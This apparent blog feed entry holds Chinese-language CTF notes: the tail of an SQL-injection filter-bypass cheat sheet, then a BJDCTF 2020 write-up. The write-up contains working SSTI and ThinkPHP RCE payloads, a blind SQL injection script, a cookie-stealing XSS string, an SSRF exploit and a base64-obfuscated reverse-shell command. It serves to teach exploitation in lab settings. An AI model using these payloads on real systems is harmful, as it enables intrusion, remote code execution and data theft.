<li><p><strong>逻辑符号的替换</strong>（and=&amp;&amp; or=|| xor=| not=!）</p>
</li>
<li><p><strong>空格绕过</strong>（用括号，+等绕过）</p>
</li>
</ul>
</li>
<li><p><strong>等价函数绕过</strong></p>
<ul>
<li>hex()、bin()=ascii()</li>
<li>concat_ws()=group_concat()</li>
<li>mid()、substr()=substring()</li>
</ul>
</li>
<li><p><strong>http参数污染</strong></p>
<p><code>id=1 union select+1,2,3+from+users+where+id=1–</code></p>
<p>变为</p>
<p><code>id=1 union select+1&amp;id=2,3+from+users+where+id=1–</code></p>
</li>
<li><p><strong>缓冲区溢出绕过</strong></p>
<p>(id=1 and (select 1)=(Select 0xAAAAAAAAAAAAAAAAAAAAA)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 ,27,28,29,30,31,32,33,34,35,36–+</p>
<p>其中0xAAAAAAAAAAAAAAAAAAAAA这里A越多越好。。一般会存在临界值，其实这种方法还对后缀名的绕过也有用)</p>
</li>
<li><p>不用or and 来进行bool盲注</p>
<p>原理</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1^1^1</span><br><span class="line">&#x3D;&gt;id&#x3D;1</span><br></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;0&#125;,1))&#x3D;&#123;1&#125;)^1&quot;</span><br><span class="line">#爆库</span><br><span class="line">1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)&#x3D;&#39;geek&#39;),%s,1))&#x3D;%s)^1</span><br><span class="line">#爆字段</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
        <category>sql</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>2020第二届BJDCTF</title>
    <url>/2020/03/23/CTF_WP/BJDCTFWP/</url>
    <content><![CDATA[<h1 id="2020第二届BJDCTF"><a href="#2020第二届BJDCTF" class="headerlink" title="2020第二届BJDCTF"></a>2020第二届BJDCTF</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="fakegoogle"><a href="#fakegoogle" class="headerlink" title="fakegoogle"></a>fakegoogle</h3><p>源码注释是SSTI</p>
<a id="more"></a>

<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;qaq?name&#x3D;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">&#x2F;qaq?name&#x3D;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flag&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
<h3 id="old-hack"><a href="#old-hack" class="headerlink" title="old_hack"></a>old_hack</h3><p>利用的是thinkphp5的RCE漏洞</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;a06ef095-a650-4053-96ad-444239c9d4db.node3.buuoj.cn&#x2F;?s&#x3D;captcha</span><br><span class="line">post data:_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure>
<h3 id="duangshell"><a href="#duangshell" class="headerlink" title="duangshell"></a>duangshell</h3><p>下载.index.php.swp,</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim index.php</span><br><span class="line">#按R还原出源码</span><br></pre></td></tr></table></figure>
<p>注册小号申请靶机,ifconfig得到靶机的ip,利用bash构造一句话反弹shell,两次base编码后发送payload</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ec&#39;&#39;ho &quot;WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE56UXVNUzQwT0M0M01DODRPRGc0SURBK0pqRT0&#x3D;&quot;|bas&#39;&#39;e64 -d|bas&#39;&#39;e64 -d|bash</span><br></pre></td></tr></table></figure>
<h3 id="简单注入"><a href="#简单注入" class="headerlink" title="简单注入"></a>简单注入</h3><p>注入脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;796d3f72-9ab1-4366-a553-0f1bee62ea1c.node3.buuoj.cn&#x2F;&quot;</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    high &#x3D; 127</span><br><span class="line">    low &#x3D; 32</span><br><span class="line">    mid &#x3D; (low + high) &#x2F;&#x2F; 2</span><br><span class="line">    while high &gt; low:</span><br><span class="line">        # password&#x3D;&#39;or ascii(substr(username,%s,1))&gt;%s#&#39;%(str(i),str(mid))</span><br><span class="line">        password &#x3D; &#39;or ascii(substr(password,%s,1))&gt;%s#&#39; % (str(i), str(mid))</span><br><span class="line">        payload &#x3D; &#123;&#39;username&#39;:&quot;\\&quot;, &#39;password&#39;:password&#125;</span><br><span class="line">        # print(payload)</span><br><span class="line">        r&#x3D;requests.post(url,data&#x3D;payload)</span><br><span class="line">        if &#39;BJD needs to be stronger&#39; in r.text:</span><br><span class="line">            low &#x3D; mid + 1</span><br><span class="line">        else:</span><br><span class="line">            high &#x3D; mid</span><br><span class="line">        mid &#x3D; (low + high) &#x2F;&#x2F; 2</span><br><span class="line">        print(chr(int(mid)),end&#x3D;&quot;&quot;)</span><br><span class="line">    flag+&#x3D;chr(int(mid))</span><br><span class="line">    print(&quot; | &quot;+flag)</span><br><span class="line">#结果,登录得到flag</span><br><span class="line">admin</span><br><span class="line">OhyOuFOuNdit</span><br></pre></td></tr></table></figure>
<h3 id="假猪套天下第一"><a href="#假猪套天下第一" class="headerlink" title="假猪套天下第一"></a>假猪套天下第一</h3><p>登录admin提示不是admin,随便输一个test,登录上,抓包发现注释L0g1n.php</p>
<p>访问L0g1n.php.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#提示</span><br><span class="line">Sorry, this site will be available after totally 99 years!</span><br><span class="line">#查看cookies发现有个time</span><br><span class="line">改成9999999999</span><br><span class="line"></span><br><span class="line">#提示</span><br><span class="line">Sorry, this site is only optimized for those who comes from localhost</span><br><span class="line">修改X-Forwarded-For:127.0.0.1</span><br><span class="line">#提示</span><br><span class="line">Do u think that I dont know X-Forwarded-For?Too young too simple sometimes naive</span><br><span class="line">#修改Client-IP:127.0.0.1</span><br><span class="line"></span><br><span class="line">#提示</span><br><span class="line">Sorry, this site is only optimized for those who come from gem-love.com</span><br><span class="line">#修改Referer:gem-love.com</span><br><span class="line"></span><br><span class="line">#提示</span><br><span class="line">Sorry, this site is only optimized for browsers that run on Commodo 64</span><br><span class="line">#修改User-Agent:Commodo 64</span><br><span class="line">#提示</span><br><span class="line">no no no i think it is not the real commmodo 64,what is the real ua for Commdo?</span><br><span class="line">#google commmodo 64有一中计算机叫Commodore 64</span><br><span class="line">#修改User-Agent:Commodore 64</span><br><span class="line"></span><br><span class="line">#提示</span><br><span class="line">Sorry, this site is only optimized for those whose email is root@gem-love.com</span><br><span class="line">#google http head email 发现有一个头叫from</span><br><span class="line">#修改From:root@gem-love.com</span><br><span class="line"></span><br><span class="line">#提示</span><br><span class="line">Sorry, this site is only optimized for those who use the http proxy of y1ng.vip if you dont have the proxy, pls contact us to buy, ￥100&#x2F;Month</span><br><span class="line">#Via 代理服务器的相关信息</span><br><span class="line">#修改Via:y1ng.vip</span><br><span class="line"></span><br><span class="line">#F12查看元素</span><br><span class="line">&lt;!--ZmxhZ3tlYzI2ZmNhMS1mYWRmLTQ0YmItYTEyYS1lNjdjOWU5NTg3Nzh9Cg&#x3D;&#x3D;--&gt;</span><br><span class="line">base64解码</span><br><span class="line">flag&#123;ec26fca1-fadf-44bb-a12a-e67c9e958778&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Schrödinger"><a href="#Schrödinger" class="headerlink" title="Schrödinger"></a>Schrödinger</h3><p>查看网页源代码有个test.php,过去看一眼是登录框,首页是一个密码爆破,于是让他自己爆破自己</p>
<p>登录框输入<code>http://127.0.0.1/test.php</code>,按input,弹窗提示URL Confirmed.查看cookies</p>
<p><code>dXNlcg=MTU4NTAxNTkwMw%3D%3D</code>base64解码得到user=1585015903,用edit cookies插件置空,刷新页面99%了,点check,得到av号,查看评论区按时间排序,查看最近的评论,得到flag</p>
<h3 id="XSS之光"><a href="#XSS之光" class="headerlink" title="XSS之光"></a>XSS之光</h3><p>扫目录发现git泄露,githack恢复得到源代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; $_GET[&#39;yds_is_so_beautiful&#39;];</span><br><span class="line">echo unserialize($a);</span><br><span class="line">&lt;?php</span><br><span class="line">#利用原生类xss</span><br><span class="line">$a &#x3D; new Exception(&#39;&lt;script&gt;window.open(document.cookie);&lt;&#x2F;script&gt;&#39;);</span><br><span class="line">#由于源代码有个echo直接反序列化字符串</span><br><span class="line">$a &#x3D; &#39;&lt;script&gt;window.open(document.cookie);&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
<p>传过去得到flag</p>
<h3 id="elementmaster"><a href="#elementmaster" class="headerlink" title="elementmaster"></a>elementmaster</h3><p>检查元素发现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;p hidden&#x3D;&quot;&quot; id&#x3D;&quot;506F2E&quot;&gt;I am the real Element Masterrr!!!!!!&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p hidden&#x3D;&quot;&quot; id&#x3D;&quot;706870&quot;&gt;@颖奇L&#39;Amore&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure>
<p>hex解码得到Po.php</p>
<p>使用bp遍历元素周期表中的元素.php</p>
<p>得到And_th3_3LemEnt5_w1LL_De5tR0y_y0u.php,访问得到flag</p>
<h3 id="文件探测"><a href="#文件探测" class="headerlink" title="文件探测"></a>文件探测</h3><p>head里面有hint home.php</p>
<p>访问,发现url包含了system.php</p>
<p>使用伪协议</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;home.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;system</span><br><span class="line">&#x2F;home.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;home</span><br></pre></td></tr></table></figure>
<p>得到源代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;system.php</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if (!isset($_COOKIE[&#39;y1ng&#39;]) || $_COOKIE[&#39;y1ng&#39;] !&#x3D;&#x3D; sha1(md5(&#39;y1ng&#39;)))&#123;</span><br><span class="line">    echo &quot;&lt;script&gt;alert(&#39;why you are here!&#39;);alert(&#39;fxck your scanner&#39;);alert(&#39;fxck you! get out!&#39;);&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">    header(&quot;Refresh:0.1;url&#x3D;index.php&quot;);</span><br><span class="line">    die;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str2 &#x3D; &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;url invalid&lt;br&gt;~$ &#39;;</span><br><span class="line">$str3 &#x3D; &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;damn hacker!&lt;br&gt;~$ &#39;;</span><br><span class="line">$str4 &#x3D; &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;request method error&lt;br&gt;~$ &#39;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD XHTML 1.0 Transitional&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;xhtml1&#x2F;DTD&#x2F;xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot;&gt;</span><br><span class="line">    &lt;title&gt;File Detector&lt;&#x2F;title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;normalize.css&quot; &#x2F;&gt;</span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;demo.css&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;component.css&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script src&#x3D;&quot;js&#x2F;modernizr.custom.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;section&gt;</span><br><span class="line">    &lt;form id&#x3D;&quot;theForm&quot; class&#x3D;&quot;simform&quot; autocomplete&#x3D;&quot;off&quot; action&#x3D;&quot;system.php&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;simform-inner&quot;&gt;</span><br><span class="line">            &lt;span&gt;&lt;p&gt;&lt;center&gt;File Detector&lt;&#x2F;center&gt;&lt;&#x2F;p&gt;&lt;&#x2F;span&gt;</span><br><span class="line">            &lt;ol class&#x3D;&quot;questions&quot;&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;span&gt;&lt;label for&#x3D;&quot;q1&quot;&gt;你知道目录下都有什么文件吗?&lt;&#x2F;label&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                    &lt;input id&#x3D;&quot;q1&quot; name&#x3D;&quot;q1&quot; type&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">                &lt;&#x2F;li&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;span&gt;&lt;label for&#x3D;&quot;q2&quot;&gt;请输入你想检测文件内容长度的url&lt;&#x2F;label&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                    &lt;input id&#x3D;&quot;q2&quot; name&#x3D;&quot;q2&quot; type&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">                &lt;&#x2F;li&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;span&gt;&lt;label for&#x3D;&quot;q1&quot;&gt;你希望以何种方式访问？GET？POST?&lt;&#x2F;label&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                    &lt;input id&#x3D;&quot;q3&quot; name&#x3D;&quot;q3&quot; type&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">                &lt;&#x2F;li&gt;</span><br><span class="line">            &lt;&#x2F;ol&gt;</span><br><span class="line">            &lt;button class&#x3D;&quot;submit&quot; type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot;&gt;提交&lt;&#x2F;button&gt;</span><br><span class="line">            &lt;div class&#x3D;&quot;controls&quot;&gt;</span><br><span class="line">                &lt;button class&#x3D;&quot;next&quot;&gt;&lt;&#x2F;button&gt;</span><br><span class="line">                &lt;div class&#x3D;&quot;progress&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">                &lt;span class&#x3D;&quot;number&quot;&gt;</span><br><span class="line">					&lt;span class&#x3D;&quot;number-current&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">					&lt;span class&#x3D;&quot;number-total&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">				&lt;&#x2F;span&gt;</span><br><span class="line">                &lt;span class&#x3D;&quot;error-message&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;span class&#x3D;&quot;final-message&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">    &lt;span&gt;&lt;p&gt;&lt;center&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;gem-love.com&quot; target&#x3D;&quot;_blank&quot;&gt;@颖奇L&#39;Amore&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&lt;&#x2F;p&gt;&lt;&#x2F;span&gt;</span><br><span class="line">&lt;&#x2F;section&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;js&#x2F;classie.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;js&#x2F;stepsForm.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">    var theForm &#x3D; document.getElementById( &#39;theForm&#39; );</span><br><span class="line"></span><br><span class="line">    new stepsForm( theForm, &#123;</span><br><span class="line">        onSubmit : function( form ) &#123;</span><br><span class="line">            classie.addClass( theForm.querySelector( &#39;.simform-inner&#39; ), &#39;hide&#39; );</span><br><span class="line">            var messageEl &#x3D; theForm.querySelector( &#39;.final-message&#39; );</span><br><span class="line">            form.submit();</span><br><span class="line">            messageEl.innerHTML &#x3D; &#39;Ok...Let me have a check&#39;;</span><br><span class="line">            classie.addClass( messageEl, &#39;show&#39; );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; );</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$filter1 &#x3D; &#39;&#x2F;^http:\&#x2F;\&#x2F;127\.0\.0\.1\&#x2F;&#x2F;i&#39;;</span><br><span class="line">$filter2 &#x3D; &#39;&#x2F;.?f.?l.?a.?g.?&#x2F;i&#39;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#39;q1&#39;]) &amp;&amp; isset($_POST[&#39;q2&#39;]) &amp;&amp; isset($_POST[&#39;q3&#39;]) ) &#123;</span><br><span class="line">    $url &#x3D; $_POST[&#39;q2&#39;].&quot;.y1ng.txt&quot;;</span><br><span class="line">    $method &#x3D; $_POST[&#39;q3&#39;];</span><br><span class="line"></span><br><span class="line">    $str1 &#x3D; &quot;~$ python fuck.py -u \&quot;&quot;.$url .&quot;\&quot; -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint&#x3D;xiangdemei&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    echo $str1;</span><br><span class="line"></span><br><span class="line">    if (!preg_match($filter1, $url) )&#123;</span><br><span class="line">        die($str2);</span><br><span class="line">    &#125;</span><br><span class="line">    if (preg_match($filter2, $url)) &#123;</span><br><span class="line">        die($str3);</span><br><span class="line">    &#125;</span><br><span class="line">    if (!preg_match(&#39;&#x2F;^GET&#x2F;i&#39;, $method) &amp;&amp; !preg_match(&#39;&#x2F;^POST&#x2F;i&#39;, $method)) &#123;</span><br><span class="line">        die($str4);</span><br><span class="line">    &#125;</span><br><span class="line">    $detect &#x3D; @file_get_contents($url, false);</span><br><span class="line">    print(sprintf(&quot;$url method&amp;content_size:$method%d&quot;, $detect));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>利用sprintf格式化字符漏洞</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q1&#x3D;y&amp;q2&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;admin.php?&amp;q3&#x3D;GET%25s%25</span><br><span class="line">&#x2F;&#x2F;admin.php?中的?是为了把拼接的.y1ng.txt当成参数废掉</span><br><span class="line">&#x2F;&#x2F;%25是%的url编码,第一个%s是为了格式化得到detect的值,第二个%是为转移掉%d使其变成%%d,格式化输出结果就是%d</span><br></pre></td></tr></table></figure>
<p>得到admin.php的源码,</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">$f1ag &#x3D; &#39;f1ag&#123;s1mpl3_SSRF_@nd_spr1ntf&#125;&#39;; &#x2F;&#x2F;fake</span><br><span class="line"></span><br><span class="line">function aesEn($data, $key)</span><br><span class="line">&#123;</span><br><span class="line">    $method &#x3D; &#39;AES-128-CBC&#39;;</span><br><span class="line">    $iv &#x3D; md5($_SERVER[&#39;REMOTE_ADDR&#39;],true);</span><br><span class="line">    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function Check()</span><br><span class="line">&#123;</span><br><span class="line">    if (isset($_COOKIE[&#39;your_ip_address&#39;]) &amp;&amp; $_COOKIE[&#39;your_ip_address&#39;] &#x3D;&#x3D;&#x3D; md5($_SERVER[&#39;REMOTE_ADDR&#39;]) &amp;&amp; $_COOKIE[&#39;y1ng&#39;] &#x3D;&#x3D;&#x3D; sha1(md5(&#39;y1ng&#39;)))</span><br><span class="line">        return true;</span><br><span class="line">    else</span><br><span class="line">        return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ( $_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D;&#x3D; &quot;127.0.0.1&quot; ) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body bgcolor&#x3D;black&gt;&lt;center&gt;&lt;font size&#x3D;&#39;10px&#39; color&#x3D;white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is &quot; . $_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$_SESSION[&#39;user&#39;] &#x3D; md5($_SERVER[&#39;REMOTE_ADDR&#39;]);</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;decrypt&#39;])) &#123;</span><br><span class="line">    $decr &#x3D; $_GET[&#39;decrypt&#39;];</span><br><span class="line">    if (Check())&#123;</span><br><span class="line">        $data &#x3D; $_SESSION[&#39;secret&#39;];</span><br><span class="line">        include &#39;flag_2sln2ndln2klnlksnf.php&#39;;</span><br><span class="line">        $cipher &#x3D; aesEn($data, &#39;y1ng&#39;);</span><br><span class="line">        if ($decr &#x3D;&#x3D;&#x3D; $cipher)&#123;</span><br><span class="line">            echo WHAT_YOU_WANT;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            die(&#39;爬&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else&#123;</span><br><span class="line">        header(&quot;Refresh:0.1;url&#x3D;index.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    &#x2F;&#x2F;I heard you can break PHP mt_rand seed</span><br><span class="line">    mt_srand(rand(0,9999999));</span><br><span class="line">    $length &#x3D; mt_rand(40,80);</span><br><span class="line">    $_SESSION[&#39;secret&#39;] &#x3D; bin2hex(random_bytes($length));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>exp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function aesEn ($key) &#123;</span><br><span class="line">	$method &#x3D; &#39;AES-128-CBC&#39;;</span><br><span class="line">	$iv &#x3D; md5(&#39;174.0.222.75&#39;, true);</span><br><span class="line">	return base64_encode(openssl_encrypt($data, $method, $key, OPENSSL_RAW_DATA, $iv));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url &#x3D; &quot;http:&#x2F;&#x2F;65a5817a-c324-407c-af18-b7c448bc09b4.node3.buuoj.cn&#x2F;admin.php?decrypt&#x3D;&quot;;</span><br><span class="line">$cookes &#x3D; &quot;y1ng&#x3D;8880cbd71721332a25aa6df7b12eb7ac53539100; your_ip_address&#x3D;76d9f00467e5ee6abc3ca60892ef304e&quot;;</span><br><span class="line">$curl &#x3D; curl_init();</span><br><span class="line">curl_setopt($curl, CURLOPT_URL, $url);</span><br><span class="line">curl_setopt($curl, CURLOPT_COOKIE, $cookes);</span><br><span class="line">$cipher &#x3D; aesEn(&#39;y1ng&#39;);</span><br><span class="line">$url &#x3D; $url . urlencode($cipher);</span><br><span class="line">curl_setopt($curl, CURLOPT_URL, $url);</span><br><span class="line">$result &#x3D; curl_exec($curl);</span><br><span class="line">var_dump($result);</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;加密方式知道,所以访问一下admin.php得到你访问的ip</span><br><span class="line">&#x2F;&#x2F;不穿PHPsessionid,session就为空,所以加密的data等于null,只要加密key就行</span><br></pre></td></tr></table></figure>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="最简单MISC"><a href="#最简单MISC" class="headerlink" title="最简单MISC"></a>最简单MISC</h3><p>7z打开,解压得到文件sercet</p>
<p>winhex查看,缺少PNG的文件头,补上文件头再修改后缀为png打开得到flag</p>
<h3 id="A-Beautiful-Picture"><a href="#A-Beautiful-Picture" class="headerlink" title="A_Beautiful_Picture"></a>A_Beautiful_Picture</h3><p>winhex打开,图片高改高得到flag</p>
<h3 id="EasyBaBa"><a href="#EasyBaBa" class="headerlink" title="EasyBaBa"></a>EasyBaBa</h3><p>binwalk分析图片</p>
<p>分理出压缩包,压缩包内是视频,打开视频,中间有一串很快的图片</p>
<p>用windows自带的照片视频打开,点编辑,一帧帧的看,有二维码的页面扫码得到下面文字</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">424A447B79316E677A756973687561697D</span><br></pre></td></tr></table></figure>
<p>hex转ASCII,调整一下顺序组成一句话,得到flag</p>
<h3 id="小姐姐"><a href="#小姐姐" class="headerlink" title="小姐姐"></a>小姐姐</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strings xiaojiejie.jpeg|grep BJD</span><br></pre></td></tr></table></figure>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="签到-y1ng"><a href="#签到-y1ng" class="headerlink" title="签到-y1ng"></a>签到-y1ng</h3><p>base64解码得到flag</p>
<h3 id="老文盲"><a href="#老文盲" class="headerlink" title="老文盲"></a>老文盲</h3><p>用百度翻译朗读</p>
<p>BJD{这就是flag},中间是原汉字</p>
<h3 id="燕言燕语"><a href="#燕言燕语" class="headerlink" title="燕言燕语"></a>燕言燕语</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20</span><br></pre></td></tr></table></figure>
<p>hex转ASCII</p>
<p>得到：<code>yanzi ZJQ&#123;xilzv_iqssuhoc_suzjg&#125;</code></p>
<p>如果是rot13,偏移量应该相同,但是这里不同,所以是维吉尼亚密码</p>
<p>yanzi 是 key，解密一下得到 flag</p>
<h3 id="灵能精通"><a href="#灵能精通" class="headerlink" title="灵能精通"></a>灵能精通</h3><p>下载得到jpg,改后缀为jpg,打开发现是一些符号,搜索一下得知是圣堂武士密码,是猪圈密码的变形</p>
<p>对应解密得到<br><code>IMKNIGHTSTEMPLAR</code><br>包上flag<br><code>flag&#123;IMKNIGHTSTEMPLAR&#125;</code></p>
<h3 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat_flag"></a>cat_flag</h3><p>猫转二进制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">01000010</span><br><span class="line">01001010</span><br><span class="line">01000100</span><br><span class="line">01111011</span><br><span class="line">01001101</span><br><span class="line">00100001</span><br><span class="line">01100001</span><br><span class="line">00110000</span><br><span class="line">01111110</span><br><span class="line">01111101</span><br><span class="line">BJD&#123;M!a0~&#125;</span><br></pre></td></tr></table></figure>]]></content>
